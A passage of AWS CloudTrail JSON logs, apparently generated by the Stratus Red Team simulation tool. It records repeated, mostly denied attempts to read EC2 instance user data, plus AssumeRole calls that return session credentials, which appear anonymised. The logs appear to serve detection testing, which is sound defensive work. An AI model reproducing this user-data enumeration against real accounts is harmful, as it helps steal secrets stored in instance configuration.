K2-zhDkMqUq-g9q-R4ks6tltFzD63SUSxwKCTu5riJZoSD2q1xthgx-uUJ0ES-JqWPLhTUEHsklWqMDa1NqCV9zjmM_HU5bzubi61HQEvxzFcppL-MtX639POzt6cD5-pTLVsUW6YAT9JzLX4c4Afn3rPb-F9HrcqUBa8P9MXv5BtTbvfHYYeLuFbf8LOS3b2v6c_Mytt7ag-xgRM54brHGy3Esp0JNbejXPCvlzvkmtppUxCs-Sq561B4o7P89gymFqqIY10tNagPMAiM7JVhidM_NzBCkF1Q3XvOw7BTrBnXT5v-g7oadbGoZ1vVe_QsoZwDTQqWAF5zniUgu89LFxiUuEZhpeirUGnTZbkIubQ4J6OCDsCmO1lDz521qUfqpthJ9M5MzznWoYyXb-Ht38YTD81mWbq1dak2t4st3uQUfNZnhbSZkA7a7D5JlgAKkoG6DXplVL-ll78WgVcAKcwSJZ29wp1SE3U6zJ09Sz6ZEuSbeIbm2nyyYYCcTQoSNBU6qK08r_L_2qSiai_DYSh_HLspQtX4OwyPdtbJjAXrlPydgBY2lmniJvZ0nKv-zTzzk\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4839af5e-7b6a-4353-a5ef-41febc9a9fa8\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:37Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"d5c299e1-afd0-464f-92d7-8219b597c93b\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-95b86090\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: _AfGAKvvBmg1J3PRHkFjzWBCMkRgqZE3AD1OiUgYd6dVN4yRyc0XzZpxeYj1vesLCnaLrBmg3nMtcSfn6ymrP4eQibOdrpNv7x4GdFBzcg6H1jchddomWF3ZbTJLKGrzD_9ygAKiyk-mB_W1pK7UfIbjZ0CLgrxJW2fgNBZp1KzZDvT7gqpI9v4h3oip_Cs_oE_Cb__1O7IthlNNfbyOBPe_E9J8bpqWMD7_IRdcnNkbprGQQ-U794zyAVVcuAm29HZBUE4MFgslthGmi5_EZtYnAz6qbT6kc9gl0ilBJiVeJ_iru-ySGXONW_OauI9u_TLGk2TRbDwuAyl5t6UXVZgmVcRx6-OOfz1rn2FCbeW1u5pbWnGCxJgmFUDOOQZOR3dJX-oRCbfgvI-kKnDYmHPF2xTks_v56oFzhrONpxzDMUosZiumPm9lP5bPCXQSkuLxE4wFFA8WGTw2KSGJC-Imzy1ia6JXXb2g3Yzsk7uyy8Xs3ylGgclmmGG8ktNHsOctUcYY5lFKDlZXeo6Y-LWYP8s2o42sOvoSoHvYyXIY_oFveAN0TfUemD3JMYM5CDQwX-E\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"5a44c114-2692-4701-bc09-faeb3f49b56d\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:37Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"712cd928-14d7-4783-ba9b-bfff98219325\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-3753597f\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: CPSSB4ODNNOXUXPaXrznW3jKaCViA5XJMIUfCdSr164Zl3rE4DaIvafRfxiNtM46GP9iOKo5UQuOJ8nl6LXDOBAipo-vFaNrFkI7kAh_9jW19q9-7L5rpv5xSSIcB8jrfrgwB966zc8KtjgTgXrE3oxkbTg60LCkPNlkWMjDaznlKQQHLJDNXu7E83sS3FIfZoBXiLuehqa-AYNeFIPMQIYcBpLGmGvPni-9EVG80mMZ4HdNtQa2aMKOUBfwXZisVmbyO2qGwPjfjVSgAJGX8wUVt4Uz8St_4O8hdL7RwQyJ-BrzTHQbt3ZzYXiet-nrKYwA8l5oIGsP7Hy9tSmnEUANWpZmboAkNc6qbxl1qfnfDxz-m80momRyAGFt7gBULvvnkYRiLJm-SQdm7dQFTbjpAUbjGA0aICT5k4KOLwQqR1iTm18jmA4NVWnAj0deEwdd46DkoI_-plbo6kpeSUD7NO1T2d_eLFOVRkha7G-fRiCaFDy2qRlBFaCd2RzEBce3UY5FG_QTn4jyWBZS0a6e2lwLpZcSuJ7wtOVGNRl8jV74VfybC60jV-XD82vjULLfdE7y\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0a4a4ee3-b1a7-4194-ab60-7465b4d5216e\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:36Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"59750908-8c42-4c10-b565-3427a5c9e8a2\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-751e5b81\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: CjrZQ3pjS8x41gRyVn1El8FK6p765IxIXyIqQRnIB_SfDAGSUpbxge9vshA3ll1RroDdvQSdsdV__Xg2WwzBoNuv7u-jnHv1H7K30GWcpYF459-XWgJX4dd7UpPYSbTER8yyz5EbkruXWoraLEsZEumgrAOhXqvBx9LdOgNlXcVn3KpofAndVdHt2qdkuQWBBtOMUTWfwg5S7MPZXrH3vcLaFiZ07n5FYJvrkInHNs1loQmLLWaTVnxOCqZjrdyhInF_ziEIFJnK4JAwkgeryGhNJN7KybjAbV80CVX6DazJ95aPze_8cqSBp2aPnBnaMUe4ftxFxOhglU6zXysDVeGSvwuKhFVJ5xxsZCAz4oUu9KWwdZx1_ufKxNkYWFVCv5cMbOyUeakUjFDalwpZYtCMW-Yi4wM6lR7uGA4uD_e2MnpAgXXnpQGnVz9-LQh_x2ceMDhkYjNq8omKnsUKDwYzIXrpzlz28T7iIlDg1CPoIKT1iQnCt6KP7RhciyEcuIHVCNtdB146CSNzdBVYUuTIfHp7pWsYUaFQXzeZpoqeNXBynb_LGlYexwGaq9ozpr5XgaU\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"962d6fc2-b79e-4d8a-a7ab-36d72048c12e\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:36Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"8fa1c8fd-196a-4fbd-bab1-75f7c3e81de2\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-df55c340\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: ykssQBy7g1b7unmht52qJO9GqEuM9SZROkjhaP7a_XsSBjG5Sj0icyonTNZIsy7CQRd_hLUQNCGqq3oF2OfoVKGcZLCBe68vuBxZntrptcrIhXwHSuMadTIFiNo30KKEarrAdzXZGrjX9uVnR4CwRkYCqW-SjaKcGzXNen6kBffzqgwxqarePx8N-ogghgLxQ6BTIvOUmVV65LGkHYpfusv6nWqPrEqjg3DCHFD_hhs28eDHzWhwoly3mNff07K03YrFo9_l0gRPb1BTO7RBj2i__rbMeIFeZhnCy-8durAXqvCJ7MI4qEBh_hV6kpaJWV498NsGquTz6TOcY40En74o0novX2014oalF8bBqB8ZMGNGngBP_Dfomt_9g7hQGE6xH9eB9c_96CsB4BVw_hhMtzsKbLej201KxqoVh92RqDhFB3xldQh-TZ-IqxAHdRZKcdaLSFUCqUihk-eguiHfDWPT7QsmDZajE2A0-JiaXzGbadVofCb6dDQ8_KzbbMh2QKXltTW6XpbhKhaEaaTjQ_LTHdLLkirn2ft5vDCR4_uQWbqEV1FJI-Vtup2WB6GGFTM\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"12b3736b-a8c7-4eaf-ae84-fa8dab5b5503\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"e9ac818a-e92c-4782-a26f-feb5555f1fe9\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-36d80d67\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: 3BD0zHY48CigR_ciFcRG14BzmH5vjQrT-QTgTppJiQ3ZWC5ZrnHzJJLNt4ddkfgHxuYlLAVYKkaY115GgvVQDWwjFH-cPsWOJc2G_a4GTJ8Znbv1aOkjTIKXYzxbO_KUS2szny9byykTkZ_SC41D-EENTd_WSdnuJGHuPghJOQzfd0D8PHoDLjObbikjQ4vfq1ewNinQXSZLNSoGs3DT0WikHe2uDVAaFHSwycFW8Bdp5y4bPVs-r6GxzoXN2JnEBxNUm7qtukD4J9-ymKfMtQwuLTcbjzb6r1gN5Jis_qDejUThSYK320IsCPJR9iR47yRyoS2Kuti6WhZ4CUjXv1-UhJpymDcM_g5i_NLQfnSy-T9qYXlj5kGSz_N9zF6jh0ZfmDsFyV_Avwov7bw6Jlgv922-ytF655M3skjZ31gf3-FScjt_sCzuKiaLTtHeSaZi4vTsHXtD-Gfl0W_BcZxTJeeJhuCzGyiLAhyXjIulmp4eWwuvBhuwPpkXIEbakpJ-pqx-rQVK9yp3NeqynD7tWeMtGQhiPl4lT1SsC1PBmJylWEimo560OKrRccI2JyXwKRE\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b6ed03db-7300-48b3-bdf4-b778a5c3e5a4\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"eea398fe-73d9-4393-ba25-ffe91a6858d1\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-2c3565b4\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"cf589cd4-9633-4cc6-9b5c-c74f5a735fa5\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:33Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"01d3746c-667c-4cf6-a149-fa51a50c2024\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n         \"roleSessionName\": \"aws-go-sdk-1722455550269043000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n            \"accountId\": \"321848314756\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n            \"assumedRoleId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIA74KS09ZFFBFV9E6K\",\n            \"expiration\": \"Jul 31, 2024, 8:07:33 PM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEHwaCWV1LXdlc3QtMSJIMEYCIQCmhF6hCfgQLCpXs5BNl3rezFcbOnrGHnQQ2xB6Eq34EAIhAJ746oP8DFnMU4kXsp422uImBq/EJapr8M+mHdV1DiEhKqsCCGUQARoMNzUxMzUzMDQxMzEwIgyczM9FaW3yVZowQgYqiAJOiTvzjvenlc5TP/18RaNfoLXOEaHfdV/MFZYEk1kiPd484q+NXdLe5qUO1aCJul9Mqb8UcGm+3c0E30UgDEhZPuxHiYxJMh3YOl1sDL+lz1KlqzFvgwsnz/iK0hDTZJRsiVzlxC0+vZDO4zW/GeT00JaqvbL/ES9DUMpoeTYJP4IAC5kmKvaSQhOyUz3VrJil/ieY2yZJ8Rwys6ogwpyVW3qtjFn89U45gRQspXslHzw/agwq419KfqSCVhQo4eBdN8sxuPbtwNI2/2Jgm3dd1ar5bb5oukFGnFGqXGuloeJzKmIjvBEpLfI5S1ZpAZp10fQdTfCj9VSdtGt4to1q5l11NaTgyiowgayqtQY6nAFxeUTuFIMlUZNzZE9Zz+FK0cBpajKVxmCQ5VQZQopSB5eVyTadj52jy5eO0LBwmgBPebBOUU60m8aOaiSRmQQOgld7X0B0xJSWVtb7yGyH686vUQM1xIVAg3aCUTObuzPv0ku4fyksvv5SFXxCxT4N8x46PlYONgq3h4T42KeOii1slPrqf47Kkjic8Mx5ZbuGUEeVkWhQodhpn2g=\"\n         }\n      },\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAMJ2320ZAXACWCPJI\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:iam::321848314756:user/christophe\",\n         \"principalId\": \"AIDA2Q68JMYYLLXFIRZ7\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"eebae605-3664-4560-a248-17d33f9ef6ef\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:33Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"bf358b35-961d-4c8b-bcfd-82b647eb825c\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n         \"roleSessionName\": \"aws-go-sdk-1722455550269043000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n            \"accountId\": \"321848314756\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n            \"assumedRoleId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n            \"expiration\": \"Jul 31, 2024, 8:07:33 PM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEHwaCWV1LXdlc3QtMSJGMEQCIGtdAaKvKWRr68HA5EuufjSaCXHXZnVIFXtcysfmdV/qAiArZ3qZEA79pcSrcLFLCIuVD3dPLjHSDUSKnQM8ASuS+SqrAghlEAEaDDc1MTM1MzA0MTMxMCIMSyGMmjPPsflcyznaKogCyZDL1PjL7bbXv3wq5QAeiC+gwSjc7zIaP9DtuEOHE/xodo5IvKBkdc0AdddeBkITU6mSNeg93iEh40BGn2mjECaGWxZXoyqkODfyg5iPU/QWPdIEuXXU9h46o9ZOLxnO8Rc4rOiIAQK0Q4tq4BE9h28QsYmQqA/wby03DDQJUpVLY3kJe7PTx20aBv7nuzExo+a5zTzJnYKhl3tzeNxJSXQRjZkAlrQZmaqf9o3Ob/uY2VBPtCu//9yglgFcFmVGGG3O4VFbJgirnPteLpwNlz2+kWpcxqCFOk1LpPqVXxKggJgkXhGXe+M17hVGuJOCWKnsb24QCT4mTtskg4PiEZ+cojYR5N2yMIGsqrUGOp4BBBrc2If35t6Jl0TKlzbemFVrgT0JCaHP1/soUTSVYTuqjf+AbRdCrr08Onez3Htr20rkPlMJj08Gpo9B7MBc4Xc5RdhgaxBUDlLlYOtmGZfSF7Y9K3ZHT2UnT6sS4IMMQfwzhGIwRMT5TTK4pm6OEqPZ1ULl0rI8nWUIr29oLsKp+0iPpXIm09jp2f7fE1FOZqBP4nrSQjyWl/LpL44=\"\n         }\n      },\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAMJ2320ZAXACWCPJI\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:iam::321848314756:user/christophe\",\n         \"principalId\": \"AIDA2Q68JMYYLLXFIRZ7\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"AccessDenied\",\n      \"errorMessage\": \"User: arn:aws:iam::321848314756:user/christophe is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4cf5dad6-648f-48eb-85a7-6181c5d79424\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:31Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"4707e217-520c-4854-833e-179f3607230a\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAMJ2320ZAXACWCPJI\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:iam::321848314756:user/christophe\",\n         \"principalId\": \"AIDA2Q68JMYYLLXFIRZ7\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": 